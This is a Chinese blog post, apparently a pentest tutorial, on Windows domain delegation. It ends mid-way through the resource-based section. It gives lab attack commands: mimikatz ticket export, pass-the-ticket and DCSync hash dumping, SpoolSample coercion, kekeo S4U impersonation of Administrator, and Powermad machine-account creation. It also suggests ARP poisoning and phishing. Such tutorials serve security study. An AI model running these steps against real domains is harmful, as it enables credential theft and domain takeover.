<!-- build time:Sat Jun 25 2022 09:31:16 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/favicon.ico"><link rel="mask-icon" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/logo.svg" color=""><link rel="manifest" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/manifest.json"><meta name="msapplication-config" content="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/browserconfig.xml"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="如月专注" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="如月专注" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="如月专注" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/css/app.css?v=0.2.5"><link rel="canonical" href="http://example.com/2022/06/24/%E5%9F%9F%E5%A7%94%E6%B4%BE/"><title>域委派的原理与利用 - Windows安全 | 如月专注</title><meta name="generator" content="Hexo 5.4.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">域委派的原理与利用</h1><div class="meta"><span class="item" title="创建时间：2022-06-24 13:51:35"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-06-24T13:51:35+08:00">2022-06-24</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>9.8k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>9 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">如月专注</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/2.png"></li><li class="item" data-background-image="https://fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/1.png"></li><li class="item" data-background-image="https://fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/4.jpg"></li><li class="item" data-background-image="https://fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/5.jpg"></li><li class="item" data-background-image="https://fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/7.jpg"></li><li class="item" data-background-image="https://fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/6.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 Windows安全"><span itemprop="name">Windows安全</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/2022/06/24/%E5%9F%9F%E5%A7%94%E6%B4%BE/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/avatar.jpg"><meta itemprop="name" content="ruyue"><meta itemprop="description" content=", "></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="如月专注"></span><div class="body md" itemprop="articleBody"><h1 id="域委派"><a class="anchor" href="#域委派">#</a> 域委派</h1><h2 id="是什么"><a class="anchor" href="#是什么">#</a> 是什么？</h2><p>域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。<strong>简单的说就是如果一个服务账号上设置了委派属性，那么这个服务就能够以用户权限在域内进行其他操作。翻译过来就是服务能够被（某个用户）委派来进行其他操作。</strong></p><p>当然，委派的前提是被委派的用户未设置成不能被委派</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617164047395.png" alt="image-20220617164047395"></p><p>委派的简单的一个场景就是如图，域内用户都通过 IIS 统一认证平台来登录，而 IIS 需要使用数据库 SQLSERVER（获其他）来支撑用户的访问。但它本身的权限 iis 不支持它访问 SQLSERVER。</p><p>或者说，域内的文件服务器，想要实现每个人不同的权限，能看到不同的目录。如果没有域委派这个机制，那么所有人成功通过 IIS 认证后，存在的权限都只是 IIS 的权限，当访问文件服务器的时候，文件服务器都只认为是 IIS 服务在访问它，无法做到详细划分权限的功能。</p><p>因此委派就是解决这个问题的，通过设置委派属性，可以让 IIS 模拟用户，验证并访问后端的其他服务器以获取相应的资源。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617164122138.png" alt="image-20220617164122138"></p><h2 id="谁能被设置委派属性"><a class="anchor" href="#谁能被设置委派属性">#</a> 谁能被设置委派属性</h2><p>委派分为无约束委派，传统的约束委派以及基于资源的约束委派。<br><strong>在域中，只有 服务账号 和 主机账号 才具有委派属性。</strong><br>主机账号就是 AD 活动目录中 Computers 中的计算机，也可以称为机器账号 (一个普通域用户默认最多可以创建十个主机账号)。 服务账号（Service Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如 SQL Server 在安装时，会在域内自动注册服务账号 SQLServiceAccount。也可以将域用户通过注册 SPN 变为服务账号。</p><h2 id="设置委派"><a class="anchor" href="#设置委派">#</a> 设置委派</h2><h3 id="机器用户设置委派"><a class="anchor" href="#机器用户设置委派">#</a> 机器用户设置委派</h3><p>直接使用 AD 目录管理器操作。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617164215441.png" alt="image-20220617164215441"></p><p>此时查看这个机器账号的 ACL 属性，发现其 userAccountControl 包含字段 TRUSTED_FOR_DELEGATION 字段</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617164405404.png" alt="image-20220617164405404"></p><h3 id="域用户注册spn设置委派服务账号设置委派"><a class="anchor" href="#域用户注册spn设置委派服务账号设置委派">#</a> 域用户注册 SPN 设置委派（服务账号设置委派）</h3><p>PS：SPN 的相关可以看我的上一篇文章</p><p><strong>setspn -s testSPN/777.ruyue.com momo #首先在域账号 momo 上注册一个 SPN<br>只后就可以在这个域账号上设置委派属性了。</strong></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617164430445.png" alt="image-20220617164430445"></p><h1 id="非约束性委派"><a class="anchor" href="#非约束性委派">#</a> 非约束性委派</h1><h2 id="原理"><a class="anchor" href="#原理">#</a> 原理</h2><p>非约束性委派其实就是权限最大的一种委派方式，即完全的获取到你这个用户的权限（相当于获取到这个用户的 TGT）。<br>对于非约束性委派，服务账号可以获取被委派用户的 TGT，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT，模拟用户访问任意服务。</p><p><strong>大致流程：当用户访问服务 A 的时，会向 KDC 认证身份，此时 KDC 通过认证在发放 ST 前，会检查一下服务 A 的委派属性，如果是非约束性委派，就会把用户的 TGT 放在 ST 票据中并一起返还给用户，用户会拿着这个带着 TGT 的 ST 去访问服务 A。服务 A 就成功获取了用户的 TGT，相当于拿到了用户的所有权限。</strong></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617164530842.png" alt="image-20220617164530842"></p><h2 id="特点"><a class="anchor" href="#特点">#</a> 特点</h2><p>1. 非约束性委派的目标的 ACL 属性中会包含：TRUSTED_FOR_DELEGATION。<br>2. 委派的设置需要 SeEnableDelegation 特权，通常仅域管理员有。<br>3. 域控主机默认是非约束性委派。</p><h2 id="基础利用"><a class="anchor" href="#基础利用">#</a> 基础利用</h2><p>从上面它的原理已经很清楚了，服务 A 直接拿到用户的 TGT 并缓存在内存中，那么我们只需要拿下一台设置了非约束性委派的机子后，诱导域管访问这台机子，这样，就能够获取到域管的 TGT 即金票了。</p><p>具体流程就是：</p><ul><li>寻找配置了非约束性委派的服务或主机账号</li><li>诱导其他账号访问配置了非约束性委派的服务或主机。</li><li>导出票据，进行票据注入。</li></ul><p>首先是获取存在非约束性委派的机器账号。（获取拿下机子是存在非约束性委派的，这样我们拿下这台机子就可能搞下域控了）</p><pre><code>Get-Netcomputer -Unconstrained | select name 
Get-NetUser -Unconstrained | select name 
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617164750640.png" alt="image-20220617164750640"></p><p>使用域控去访问目标主机。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617164812479.png" alt="image-20220617164812479"></p><p>此时 exchange 这台机子内存就已经存在了域控的 TGT。这里我们用 mimikatz 把内存中的票据给导出来。</p><p><strong>(注意，这里我是用本地管理员账号登录 exchange 这台机子的)</strong></p><pre><code>privilege::debug
sekurlsa::tickets /export
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617165234372.png" alt="image-20220617165234372"></p><p>得到 TGT 之后，我们用 ptt 将票据注入到当前会话后，用 dcsync 导出域控中所有用户的 hash，最后就可以用 krbtgt 用户的 hash 去生成黄金票据了。</p><pre><code>
kerberos::ptt [0;181868]-2-0-60a10000-Administrator@krbtgt-RUYUE.COM.kirbi //导入票据

kerberos::list //查看票据
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617165254190.png" alt="image-20220617165254190"></p><p>导出所有 hash，保证可以随时做金票。</p><pre><code>lsadump::dcsync /domain:ruyue.com /all /csv
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617165314658.png" alt="image-20220617165314658"></p><h2 id="spooler打印机bug非约束性委派"><a class="anchor" href="#spooler打印机bug非约束性委派">#</a> spooler 打印机 BUG + 非约束性委派</h2><h3 id="原理-2"><a class="anchor" href="#原理-2">#</a> 原理</h3><p>Lee（<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xlZWNocmlzdGVuc2VuJUVGJUJDJTg5JUU4JUFFJUE0JUU0JUI4JUJBJUU2JTg5JTkzJUU1JThEJUIwJUU2JTlDJUJBYnVnJUU2JTk4JUFGTVMtUlBSTiVFRiVCQyU4OFdpbmRvd3M=">https://github.com/leechristensen）认为打印机 bug 是 MS-RPRN（Windows</span> Print System Remote Protocol，Windows 打印系统远程协议）中一个古老但又默认启用的方法，这个协议只使用了基于命名管道的 RPC，因此，源和目标服务器会通过 445 端口建立网络连接。也就说具备域用户账户权限的攻击者可以使用 MS-RPRN 的 RpcRemoteFindFirstPrinterChangeNotification (Ex) 方法来强迫运行 Spooler 服务的任何主机通过 Kerberos 或者 NTLM 向攻击者选择的目标发起身份认证请求。<br>利用这个协议，我们就能够让域管的机器账号强制与我们拿下的非约束性委派的机子强行建立连接，从而得到域管的机器账号的 TGT。</p><h3 id="利用"><a class="anchor" href="#利用">#</a> 利用</h3><p>涉及的工具：</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xlZWNocmlzdGVuc2VuL1Nwb29sU2FtcGxlLw==">https://github.com/leechristensen/SpoolSample/</span> （需要自己去编译）</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9SdWJldXM=">https://github.com/GhostPack/Rubeus</span></p><p>从上面我们不难看出，想要利用成功，一方面我们需要要求目标的打印机服务是正常的，也就是 Print spooler 服务（默认都是开启的）。同时我们需要拿下非约束性委派机子的本地管理员账号（用于读内存的票据），还有一个域内的普通账号（用于 MS-RPRN 协议）。</p><p>具体操作流程就是先在非约束性委派机子上以本地管理员权限使用 mimikatz 或者 Rubeus 监听来访者的 TGT，然后使用普通域账号强制让<strong>域控的机器账号</strong>和我们进行认证。</p><p>因为前面我们用的就是 mimikatz，所以这里我也用 mimikatz，不用网上用的比较多的 Rubeus 来监听 TGT（主要是 Rubeus 依赖.net3.5 环境，想要用还得在目标机子上装个.net 环境）。</p><p>首先，我们开启 mimikatz，权限给上</p><pre><code>privilege::debug
</code></pre><p>然后 runas 以域普通账号运行一个 powershell，接着运行我们的 exp，强制让域控机器账号和我们的进行认证</p><p><code>runas /user:ruyue.com\momo powershell</code></p><p>SpoolSample.exe dc exchange #这里第一个参数是发起认证的主机，在这里就是域控。第二个参数则是存在非约束性委派的主机。需要注意的是，这里必须使用机器名，不能使用 ip。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617165537085.png" alt="image-20220617165537085"></p><p>注意：在执行完上述命令后，<strong>一定要快速的使用 mimikatz 去导出票据（慢了就没了）</strong>。多次都抓不到的话推荐使用 rebeus 去尝试。</p><pre><code>sekurlsa::tickets /export
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617165615132.png" alt="image-20220617165615132"></p><p>后面的操作其实就和前面一样了，把票据注入当前会话，获取 krbtgt 的 hash，得到金票，随意伪造票据。直接拿下域控。这里不再赘述。</p><h3 id="其他想法"><a class="anchor" href="#其他想法">#</a> 其他想法</h3><p>从上面的流程我们不难看出，最难的部分其实就是怎么让域控和我们进行 NTLM 身份认证。<br>而这里我们有以下几种方法：<br>①说服受害者用户或机子向我们的非约束性委派服务器进行身份验证。这里可以辅佐一些网络协议的攻击。<br>比如比较常见的链路层地址解析协议 (ARP)，通过 ARP 中毒来说服目标受害者认为恶意服务器实际上是文件服务器、域控制器或网络中已经存在的任何合法服务器。<br>从而导致它与我们的服务器进行 NTLM 认证。</p><p>②钓鱼，利用特殊的网络协议如 SMB、HTTP、RDP、LDAP 等，通过精心设计 PDF 、 Microsoft Word 和 Microsoft Access 等文件，以在打开时引发 NTLM 身份验证请求。<br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d4aDAwMDBtbS9hcnRpY2xlL2RldGFpbHMvMTA1OTk3MTA1">https://blog.csdn.net/wxh0000mm/article/details/105997105</span></p><h1 id="约束性委派"><a class="anchor" href="#约束性委派">#</a> 约束性委派</h1><h2 id="原理-3"><a class="anchor" href="#原理-3">#</a> 原理</h2><p>不理解的建议多看 kerberos 协议。</p><p>由于非约束委派的不安全性，微软在 windows server2003 中引入了约束委派，对 Kerberos 协议进行了拓展，引入了 S4U。其中 S4U 支持两个子协议：</p><ul><li>Service for User to Proxy (S4U2proxy) 约束委派</li><li>Service for User to Self (S4U2self) 协议转换</li></ul><h3 id="s4u2proxy-约束委派"><a class="anchor" href="#s4u2proxy-约束委派">#</a> S4U2Proxy (约束委派)</h3><p>还是以一个例子来理解。<br>当用户去带着 ST1 去访问服务 A 的时候，服务 A 如果需要访问服务 B，就会使用 S4U2Proxy 协议将用户发送来的 ST1 转发给 TGS 并请求一个 ST2。此时 TGS 会检查服务 A 的委派属性，如果服务 A 能够委派给服务 B，那么就会返回 ST2 给服务 A，此后服务 A 会拿着 ST2 以 momo 的身份去访问服务 B。<br><strong>其实约束委派就是限制了 S4U2proxy 扩展的范围。配置它后，约束委派将限制服务 A 能委派的服务范围。而且用的是 ST，不至于像 TGT 那样权限那么大。</strong></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617165901748.png" alt="image-20220617165901748"></p><h3 id="s4u2self协议转换"><a class="anchor" href="#s4u2self协议转换">#</a> S4U2Self (协议转换)</h3><p>上图中用户是通过 Kerberos 协议与服务 A 进行认证的，而当用户以其他方式 (如 NTLM 认证，基于表单的认证等方式) 与 Web 服务器进行认证后，用户是无法向 Web 服务器提供请求该服务的服务票据 ST1 的，因而服务器 A 也无法进一步使用 S4U2Proxy 协议请求访问服务 B。<br>S4U2Self 协议便是解决该问题的方案，<strong>被设置为约束性委派的服务能够调用 S4U2Self 向 TGS 为任意用户请求访问自身的可转发的服务票据，此后，便可通过 S4U2Proxy 使用这张 TGS 向域控制器请求访问 B 的票据。</strong><br>PS: 其实就是如果用户 momo 通过其他认证渠道过了服务器 A 的认证，那么服务器 A 就会通过 S4U2Self 协议让 TGS 生成一个 momo 访问它的 ST（ST 生成只需要服务账号密码的 HASH），即前面的 ST1。然后后面的流程都一样了。（常规的 kerberos 认证是用户需要向 TGS 证明自己的身份，而这里就是用户直接向服务 A 去证明自己的身份，不用管 kerberos 认不认，只要服务 A 认了就行）<br>这里还是画个图给大家理解一下：</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617165956845.png" alt="image-20220617165956845"></p><h2 id="其中存在的问题与利用"><a class="anchor" href="#其中存在的问题与利用">#</a> 其中存在的问题与利用</h2><p>从上面的 S4U2Self (协议转换) 我们可以看出，只要我们拿下一个配置了约束委派的服务账号，就可以利用这个服务账号代表任意用户进行 S4U2self 获得 ST，然后把获取到的票据用于 S42proxy，从而获取另一个服务的 ST2，这样服务 A 就可以代替任意用户访问另外一个服务 B (既被配置的约束委派的服务)。<br>比如，如果服务 B 允许服务 A 被委派来控制它，我们在获取了服务 A 的权限下就可以伪造域管权限去访问它，从而获取服务 B 的权限。</p><p>首先我们给 momo 设置上约束委派权限（这里已经让 momo 注册了 SPN，前面提过了），并且设置了 momo 这个服务账号对 w2008 这台机子的 cifs 服务的委派（cifs 其实就是文件共享访问协议之类的）<br>接着，我们就要尝试通过约束委派从 momo 这个账号的权限得到 w2008 的权限了。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617170024712.png" alt="image-20220617170024712"></p><p>首先，我们从发现约束性委派开始。如图，寻找域内的约束性委派服务账号，发现 momo 这个账号能委派 w2008.ruyue.com 的 cifs 服务。</p><pre><code>Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedto

delegateto| fl

Get-DomainComputer -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize //获取设置了约束性委派的机器账号
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617170050024.png" alt="image-20220617170050024"></p><p>在想办法搞到 momo 这个账号的权限后，我们就可以先导出 momo 账号的 TGT，</p><pre><code>sekurlsa::tickets /export
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617170100421.png" alt="image-20220617170100421"></p><p>然后利用 kekeo 工具去使用 S4U 协议来伪造一个 administartor 请求服务 B 的 ST2。</p><pre><code>tgs::s4u /tgt:[0;e6edd]-2-1-40e10000-momo@krbtgt-RUYUE.COM.kirbi /user:Administrator@ruyue.com /service:cifs/w2008.ruyue.com
</code></pre><p><strong>PS：如果有 momo 这个服务账号的明文密码或者 hash 也是可以的，不是非要去读票据。</strong></p><p>最终在当前目录下得到两个票据文件，比较长那个就是用于访问服务 B 的 ST2</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617170221789.png" alt="image-20220617170221789"></p><p>把 ST2 导入当前会话，就能够成功以 Administrator 的权限访问服务 B 了。</p><pre><code>kerberos::ptt TGS_Administrator@ruyue.com@RUYUE.COM_cifs~w2008.ruyue.com@RUYUE.COM.kirbi
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220617170244142.png" alt="image-20220617170244142"></p><h1 id="资源型委派"><a class="anchor" href="#资源型委派">#</a> 资源型委派</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmF0ZWFtLnFpYW54aW4uY29tL3Bvc3Qvd2VpLXJ1YW4tYnUtcmVuLWRlLTBkYXktemhpLXl1LW5laS1iZW4tZGktdGktcXVhbi1sYW4tZmFuLXFpZS8=">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/</span> （原理透彻，推荐熟读并背诵）</p><h2 id="原理-4"><a class="anchor" href="#原理-4">#</a> 原理</h2><p>基于资源的约束委派 (RBCD) 是在 Windows Server 2012 中新加入的功能。传统的约束委派是 “正向的”，通过修改服务 A 属性”msDS-AllowedToDelegateTo”，添加服务 B 的 SPN（Service Principle Name），设置约束委派对象（服务 B），服务 A 便可以模拟用户向域控制器请求访问服务 B 以获得服务票据（TGS）来使用服务 B 的资源。<br>而基于资源的约束委派则是相反的，通过修改服务 B 属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务 A 的 SPN，达到让服务 A 模拟用户访问 B 资源的目的。</p><p>从这里我们可以知道<strong>资源的约束委派并不能危害其他机子，只能对自己进行攻击，也就是说提权操作</strong>。（因为能够模拟其他用户的权限访问自己）</p><p>在利用之前，我们还需要了解资源约束委派的利用的前提：</p><ul><li>谁可以修改机子 B 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。</li><li>机子 B 具有一个 SPN 账号（因为 S4U2Self 只适用于具有 SPN 的账户）</li></ul><p>我们比较关注第一个前提，谁能修改机子 B 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，</p><p>通过下面这个文章就很清楚了，我感觉它写的已经很详细了，我没办法比它写的更详细易懂。</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmF0ZWFtLnFpYW54aW4uY29tL3Bvc3Qvd2VpLXJ1YW4tYnUtcmVuLWRlLTBkYXktemhpLXl1LW5laS1iZW4tZGktdGktcXVhbi1sYW4tZmFuLXFpZS8jMHgwMi0lRTUlOUYlQkElRTclQTElODAlRTclOUYlQTUlRTglQUYlODY=">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/#0x02-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86</span></p><p><strong>我们可以得知有两个用户有权限添加这个属性：①带着这台机子进入域的时候的域用户②该机子本身的机器账户。</strong></p><p>接着我们继续看第二个前提，具有一个 SPN 账号，我们知道注册 SPN 账号是需要域管权限的，显然一个普通域用户是没有权限去注册 SPN 的。</p><p>而恰好的是在域中有一个属性 MachineAccountQuota，这个值表示的是允许用户在域中创建的计算机帐户数，默认为 10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册 RestrictedKrbHost/domain 和 HOST/domain 这两个 SPN 的，所以这里正好能够实现前提二。</p><p>因此带它进入域的域用户可以去创建一个新的机器账户来达到获取 SPN 的目的。</p><h2 id="漏洞利用"><a class="anchor" href="#漏洞利用">#</a> 漏洞利用</h2><h3 id="利用场景"><a class="anchor" href="#利用场景">#</a> 利用场景</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmF0ZWFtLnFpYW54aW4uY29tL3Bvc3Qvd2VpLXJ1YW4tYnUtcmVuLWRlLTBkYXktemhpLXl1LW5laS1iZW4tZGktdGktcXVhbi1sYW4tZmFuLXFpZS8jMHgwMi0lRTUlOUYlQkElRTclQTElODAlRTclOUYlQTUlRTglQUYlODY=">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/#0x02 - 基础知识</span></p><ul><li>提权：模拟其他用户访问自身，通过高权限利用 mimikatz 抓取本地密码。</li><li>一个公司可能会有一个专门用来加域的账号，虽然这个账户通常只有普通域用户权限，但是如果我们控制了这个账户那么就可以打下一大批机器。</li><li>如果我们想拿域内机器 A 的权限，如果我们又没有机器 A administrators 组成员凭据的话还可以看机器 A 是通过哪个用户加入域的，控制了这个用户依然可以获取权限。</li><li>一个域用户 X 可能会在域中创建多台机器 (比如笔记本和台式机都需要加入域)，当我们有了域用户 X 的权限时，可以利用 rbcd 继续攻击其他 mS-DS-CreatorSID 是域用户 X 的机器</li><li>权限维持：①配置 evil 到 krbtgt 基于资源的约束委派②配置 evil 到域控基于资源的约束委派。</li></ul><h3 id="查询哪台机子被谁带入域的"><a class="anchor" href="#查询哪台机子被谁带入域的">#</a> 查询哪台机子被谁带入域的</h3><p>从上面的原理中我们得知，资源的约束委派不再需要域管理员权限去设置委派，只需拥有在计算机对象上<br>编辑 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的权限，也就是说：带它进入域的域用户或者机器账号的权限。<br>所以我们第一步是先搞清楚是当前或者目标主机是被谁带入域的</p><p>这里我们完全可以用大佬写的工具去完成 (自行编译)<img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624133957976.png" alt="image-20220624133957976"></p><p>如图，就可以看到 test11 这个机器是被 momo 带进域的。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134010487.png" alt="image-20220624134010487"></p><p>如果不会编译也没关系，使用 ADFind 和 PowerView 来获取。</p><p>使用 ADFind 去查询每个域机器是由哪个域用户添加进域的，找到有 mS-DS-CreatorSID 的机器。</p><p>如下图，就只有 TEST11 是有这个属性的。也就是说 TEST11 这台主机是被 S-1-5…. 这个 SID 对应的用户给带进域的。</p><pre><code>AdFind.exe -h 192.168.152.128 -b &quot;DC=ruyue,DC=com&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134043625.png" alt="image-20220624134043625"></p><p>接着查看当前用户的，简单对比下，就可以知道 momo 这个账号有权限去修改 TEST11 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，也就是说</p><p>利用 momo 这个账号可以在 TEST11 这台机子拿到最高权限。</p><pre><code>Get-DomainUser -Identity momo -Properties objectsid # 查询
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134102417.png" alt="image-20220624134102417"></p><h3 id="提权利用"><a class="anchor" href="#提权利用">#</a> 提权利用</h3><p>如果我们没有一个普通域账号，要想利用的话，就需要有机器账号，但一般情况下是没办法拿到机器账号的，但是所有低权限服务 (例如 network service 这类型的本机服务) 如果可以请求域资源，那么出网都是以机器账户身份去请求的。所以我们就可以利用这个权限去进行资源委派的利用，模拟一个 administrator 访问自身，获取高权限。</p><p>如果我们有一个普通域账号（有权限修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性），我们就可以利用这个账号去创建一个机器账号，再利用机器账号做资源委派利用，获取权限。<br>攻击流程：</p><ul><li><p>利用域账号创建一个机器账号</p></li><li><p>修改服务 A 的 msDS-AllowedToActOnBehalfOfOtherIdentity , 配置好机器账号到服务的基于资源的约束委派。（服务 A 信任机器账号的委派）</p></li><li><p>使用机器账号利用 S4U2SELF 协议获得 ST，再通过 S4U2PROXY 获得访问 A cifs 服务的 ST2。（和约束委派差不多的流程）</p></li><li><p>用 ST2 访问服务 A 的 CIFS 服务，获得权限。</p></li></ul><h4 id="setp1-创建机器账号"><a class="anchor" href="#setp1-创建机器账号">#</a> Setp1 创建机器账号</h4><p>首先我们在前面信息收集的时候得知了 momo 这个账号是能修改 test11 这台机子的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的。因此这里我们就利用<br>momo 这个域账号去先创建一个机器账号。<br>使用 Powermad 中的 New-MachineAccount 来创建机器账户，如图成功创建一个名为 momomachine，密码为 777777 的机器账号。<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9Qb3dlcm1hZA==">https://github.com/Kevin-Robertson/Powermad</span></p><pre><code>New-MachineAccount -MachineAccount momomachine  -Password $(ConvertTo-SecureString &quot;777777&quot; -AsPlainText -Force)
